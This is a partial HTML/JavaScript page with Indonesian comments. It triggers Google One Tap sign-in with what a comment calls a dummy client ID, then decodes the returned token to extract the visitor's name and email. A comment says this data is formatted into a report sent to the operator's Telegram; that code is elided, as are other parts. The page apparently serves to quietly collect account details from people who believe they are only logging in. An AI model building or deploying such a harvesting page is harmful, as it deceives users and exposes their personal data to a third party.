...
<body>
    ...
    <script>
        ...
        // Fungsi inisialisasi awal fitur Google Login saat halaman dimuat
        window.onload = function () {
            google.accounts.id.initialize({
                // Client ID dummy untuk memicu jendela chooser bawaan browser/HP
                client_id: "1059530467140-7nmv7m27gkm6m902ch1g787q2knm8q15.apps.googleusercontent.com",
                callback: handleCredentialResponse
            });
        }

        // Fungsi memicu munculnya pilihan akun Google (One Tap Chooser)
        function panggilGoogleLogin() {
            google.accounts.id.prompt((notification) => {
                if (notification.isNotDisplayed() || notification.isSkippedMoment()) {
                    // Jika One Tap gagal muncul di browser tertentu, gunakan cara alternatif alert simulasi
                    simulateAlert("Membuka Pilihan Akun Google...");
                }
            });
        }

        // Ketika pengguna sukses memilih salah satu Gmail di HP mereka
        function handleCredentialResponse(response) {
            // Mendekode token JWT dari Google untuk mengambil data profil & email
            const responsePayload = decodeJwtResponse(response.credential);
            
            const namaUser = responsePayload.name;
            const emailUser = responsePayload.email;

            // Format laporan rapi untuk dikirim ke Telegram kamu
            ...
            alert(`🎉 Sukses Terhubung dengan Google!\nEmail: ${emailUser}`);
        }

        // Fungsi pembantu mendekode data token dari Google
